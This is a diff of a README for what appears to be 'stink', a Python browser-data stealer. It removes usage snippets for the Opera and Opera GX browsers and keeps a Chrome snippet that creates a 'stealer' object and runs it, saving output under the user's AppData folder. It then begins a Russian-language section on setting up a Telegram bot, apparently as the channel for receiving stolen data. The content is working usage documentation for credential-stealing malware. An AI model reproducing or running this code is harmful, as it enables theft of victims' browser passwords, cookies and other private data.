@@ -62,40 +62,6 @@ if not path.exists(storage_path + storage_folder):
 stealer = Chrome(storage_path=storage_path, storage_folder=storage_folder)
 stealer.run()
 ```
-#### Opera
-```python
-from os import path, mkdir
-
-from stink.browsers.opera_default import Opera_Default
-from getpass import getuser
-
-storage_path = f"C:/Users/{getuser()}/AppData/"
-storage_folder = "files/"
-
-if not path.exists(storage_path + storage_folder):
-
-    mkdir(storage_path + storage_folder)
-
-stealer = Opera_Default(storage_path=storage_path, storage_folder=storage_folder)
-stealer.run()
-```
-#### Opera GX
-```python
-from os import path, mkdir
-
-from stink.browsers.opera_gx import Opera_GX
-from getpass import getuser
-
-storage_path = f"C:/Users/{getuser()}/AppData/"
-storage_folder = "files/"
-
-if not path.exists(storage_path + storage_folder):
-
-    mkdir(storage_path + storage_folder)
-
-stealer = Opera_GX(storage_path=storage_path, storage_folder=storage_folder)
-stealer.run()
-```
 ## Настройка Telegram бота
 ### Получение токена
 1. Открываем чат с [BotFather](https://t.me/botfather).
